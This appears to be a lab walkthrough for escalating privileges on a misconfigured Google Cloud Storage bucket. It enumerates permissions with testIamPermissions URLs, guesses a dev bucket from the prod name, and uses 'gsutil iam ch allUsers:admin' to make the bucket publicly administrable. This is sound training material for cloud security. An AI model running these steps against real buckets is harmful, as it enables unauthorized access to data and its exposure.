# Objective

We will try to use the misconfigured bucket policies to get admin access on one of the buckets.

# Solution

**Step 1:** Open the web application put in the login credentials and start interacting with the web app.

![](https://user-images.githubusercontent.com/54552051/204803754-091bc173-00b8-4151-b126-4e5f92af98a4.png)

![](https://user-images.githubusercontent.com/54552051/204803761-4c1deef3-bb2b-4f44-94be-b41b0dd45a6b.png)

**Step 2:** Open any of the blogs from the home page.

![](https://user-images.githubusercontent.com/54552051/204803763-0a423523-f7a9-429c-bc74-2bed9d44515b.png)

Open the image of the blog in the new tab by right-clicking on it and following the same.

![](https://user-images.githubusercontent.com/54552051/204803768-7492553d-80f5-42d7-bea9-df0f5af2fe1c.png)

**Step 3:** Here you find that the image is being fetched from a google storage bucket.

![](https://user-images.githubusercontent.com/54552051/204803771-ddad9684-d6ee-46c0-90b2-ddf262ceb5ce.png)

You can find the name of the bucket as highlighted in the above image, after the *storage.googleapis.com*. Take note of this name.

**Step 4:** Fetch the bucket contents by using the below URL

```
https://storage.googleapis.com/<BUCKET NAME>
```

**Note:** Replace the <BUCKET NAME> with your current bucket name.

![](https://user-images.githubusercontent.com/54552051/204803773-730a08ef-ee34-4af3-92c5-eef0aa06687e.png)

The access will be denied onto the bucket to list out all the content.

**Step 5:** Use the below URL to find out all the permissions you have on this bucket.

```
https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam/testPermissions?permissions=storage.buckets.delete&permissions=storage.buckets.get&permissions=storage.buckets.getIamPolicy&permissions=storage.buckets.setIamPolicy&permissions=storage.buckets.update&permissions=storage.objects.create&permissions=storage.objects.delete&permissions=storage.objects.get&permissions=storage.objects.list&permissions=storage.objects.update
```

**Note:** replace BUCKET_NAME with your current bucket name.

The Google Storage TestIamPermissionsAPI allows us to supply a bucket name and list of Google Storage permissions, and it will respond with the permissions we have on that bucket. This completely bypasses the requirement of viewing the bucket policy and could potentially even give us better information (in the case of a custom role being used).

![](https://user-images.githubusercontent.com/54552051/204803776-434646aa-816b-4fc8-98d9-1792f6072711.png)

This bucket only has read access which is "storage.buckets.get". But the bucket name is starting from **prod** so there can be a dev bucket also.

**Step 6:** Try to access all the contents of the dev bucket by simply replacing the **prod** with **dev**.

```
https://storage.googleapis.com/<DEV BUCKET NAME>
```

![](https://user-images.githubusercontent.com/54552051/204803779-497a59d7-80b1-4632-9582-f1407f951684.png)

Here also we got the access denied same as the prod bucket. But this confirms that there is a dev bucket.

**Step 7:** List out all the permissions we have on the dev bucket.

```
https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam/testPermissions?permissions=storage.buckets.delete&permissions=storage.buckets.get&permissions=storage.buckets.getIamPolicy&permissions=storage.buckets.setIamPolicy&permissions=storage.buckets.update&permissions=storage.objects.create&permissions=storage.objects.delete&permissions=storage.objects.get&permissions=storage.objects.list&permissions=storage.objects.update
```

Note: replace BUCKET_NAME with your dev bucket name.

![](https://user-images.githubusercontent.com/54552051/204803781-38285e67-bf79-4691-ab06-51eedd36bb54.png)

Here we have two more interesting permission along with the get permissions.

* storage.buckets.setIamPolicy - This grants permission to set IAM policies in the bucket.
* storage.buckets.getIamPolicy - This grants permission to read IAM policies in the bucket.

**Step 8:** list IAM roles attached to this bucket with the gsutil tool.

gsutil is a Python application that lets you access Cloud Storage from the command line. You can use gsutil to do a wide range of bucket and object management tasks.

Use the following command to list all IAM permissions and roles attached to this bucket.

```
gsutil iam get gs://<BUCKET NAME>
```

![](https://user-images.githubusercontent.com/54552051/204803786-df0d5b6f-c7b1-4d1e-a884-a71184dfa967.png)

Here allUsers which is for anonymous user has a custom role attached to them. Which had those 3 permissions we saw in the previous step.

**Step 9:** Add an admin role for allUsers using the following command such that we can do all the operations in the bucket.

```
gsutil iam ch allUsers:admin gs://<BUCKET NAME>
```

![](https://user-images.githubusercontent.com/54552051/204803788-f6109fa8-c8d9-443e-8dd4-d8e548c04096.png)

**Step 10:** Again list the IAM roles attached to the bucket to confirm that admin roles are added to it using the gsutil tool.

```
gsutil iam get gs://<BUCKET NAME>
```

![](https://user-images.githubusercontent.com/54552051/204803791-e2d36f01-9e11-4c62-8748-78b3fb0d9b16.png)

Successfully added an admin role for all users.

**Step 11:** List out all the permissions onto this bucket with the below URL.

```
https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam/testPermissions?permissions=storage.buckets.delete&permissions=storage.buckets.get&permissions=storage.buckets.getIamPolicy&permissions=storage.buckets.setIamPolicy&permissions=storage.buckets.update&permissions=storage.objects.create&permissions=storage.objects.delete&permissions=storage.objects.get&permissions=storage.objects.list&permissions=storage.objects.update
```

Note: replace BUCKET_NAME with your dev bucket name.

![](https://user-images.githubusercontent.com/54552051/204803798-c39a7bab-0380-49d2-86cb-acd600203172.png)

You can see now we have all kinds of access to this bucket.

**Step 12:** List out all the content inside the bucket to verify the same.

```
https://storage.googleapis.com/<DEV BUCKET NAME>
```

![](https://user-images.githubusercontent.com/54552051/204803801-bfa0ab6c-402b-4321-8342-71bd893941b0.png)

The content of the bucket is listing out. This means you have successfully elevated your privileges onto this bucket.